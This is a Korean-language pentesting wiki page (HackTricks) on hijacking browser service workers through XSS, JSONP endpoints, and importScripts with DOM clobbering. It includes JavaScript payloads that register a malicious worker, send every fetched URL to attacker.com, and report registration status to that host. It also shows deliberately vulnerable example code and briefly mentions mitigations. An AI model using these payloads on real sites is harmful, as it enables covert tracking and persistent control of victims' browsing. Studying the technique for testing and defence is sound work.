# Service Workers 남용하기



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상 표면을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 기본 정보

**서비스 워커(Service Worker)**는 웹 페이지나 사용자 상호작용이 필요하지 않은 기능을 가능하게 하는 웹 브라우저에서 독립적으로 실행되는 백그라운드 스크립트입니다. 서비스 워커에 대한 자세한 정보는 [여기](https://developers.google.com/web/fundamentals/primers/service-workers)에서 찾을 수 있습니다. 취약한 웹 도메인 내에서 서비스 워커를 악용함으로써 공격자는 해당 도메인 내의 모든 페이지와 피해자의 상호작용을 제어할 수 있습니다.


### 기존 서비스 워커 확인

기존 서비스 워커는 **개발자 도구**의 **Application** 탭의 **Service Workers** 섹션에서 확인할 수 있습니다. 더 자세한 정보를 보려면 [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)를 방문하면 됩니다.

### 푸시 알림

**푸시 알림 권한**은 **서비스 워커**가 직접적인 사용자 상호작용 없이 서버와 통신할 수 있는 능력에 영향을 미칩니다. 권한이 거부되면 서비스 워커의 잠재적인 위협을 제한합니다. 반대로 권한을 부여하면 잠재적인 악용의 수신 및 실행을 허용하여 보안 위험을 증가시킵니다.

## 서비스 워커 생성 공격

이 취약점을 악용하기 위해 다음을 찾아야 합니다:

* 서버에 **임의의 JS 파일을 업로드**할 수 있는 방법과 업로드한 JS 파일의 **서비스 워커를 로드할 XSS**
* **취약한 JSONP 요청**에서 **출력을 조작할 수 있는 방법 (임의의 JS 코드와 함께)** 및 **악성 서비스 워커를 로드할 XSS**.

다음 예제에서는 `fetch` 이벤트를 수신하고 모든 가져온 URL을 공격자의 서버로 **전송하는 새로운 서비스 워커를 등록**하는 코드를 제시하겠습니다 (이 코드는 **서버**에 **업로드**하거나 **취약한 JSONP** 응답을 통해 로드해야 하는 코드입니다):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
그리고 이것은 **워커를 등록**할 코드입니다 (**XSS**를 악용하여 실행할 수 있는 코드). 이 경우 **공격자**의 서버로 **GET** 요청이 전송되어 서비스 워커의 **등록**이 성공했는지 여부를 **알립니다**:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
취약한 JSONP 엔드포인트를 악용하는 경우 `var sw` 안에 값을 넣어야 합니다. 예를 들어:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**서비스 워커(SW)의 악용**을 위한 **C2**인 [**Shadow Workers**](https://shadow-workers.github.io)가 있으며, 이는 이러한 취약점을 악용하는 데 매우 유용할 것입니다.

**24시간 캐시 지시문**은 악성 또는 침해된 **서비스 워커(SW)**의 수명을 최대 24시간으로 제한합니다. 이는 XSS 취약점 수정 후 온라인 클라이언트 상태를 가정합니다. 취약성을 최소화하기 위해 사이트 운영자는 SW 스크립트의 Time-To-Live (TTL)을 낮출 수 있습니다. 개발자들은 또한 빠른 비활성화를 위해 [**서비스 워커 kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)를 생성하는 것이 좋습니다.

## DOM Clobbering을 통한 SW에서 `importScripts` 악용

서비스 워커에서 호출되는 **`importScripts`** 함수는 **다른 도메인에서 스크립트를 가져올 수 있습니다**. 이 함수가 **공격자가 수정할 수 있는 매개변수**를 사용하여 호출되면, 그는 **자신의 도메인에서 JS 스크립트를 가져와 XSS를 얻을 수 있습니다**.

**이는 CSP 보호도 우회합니다.**

**취약한 코드 예시:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering을 사용하는 경우

DOM Clobbering이 무엇인지에 대한 자세한 정보는 다음을 참조하십시오:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

SW이 **`importScripts`**를 호출하는 데 사용하는 URL/도메인이 **HTML 요소 내에 있는 경우**, DOM Clobbering을 통해 해당 URL을 수정하여 SW가 **자체 도메인에서 스크립트를 로드하도록** 할 수 있습니다.

이에 대한 예제는 참조 링크를 확인하십시오.

## 참고 자료

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정하세요. Intruder는 공격 표면을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **자신의 해킹 기법을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 PR을 제출하여 공유하세요.**

</details>
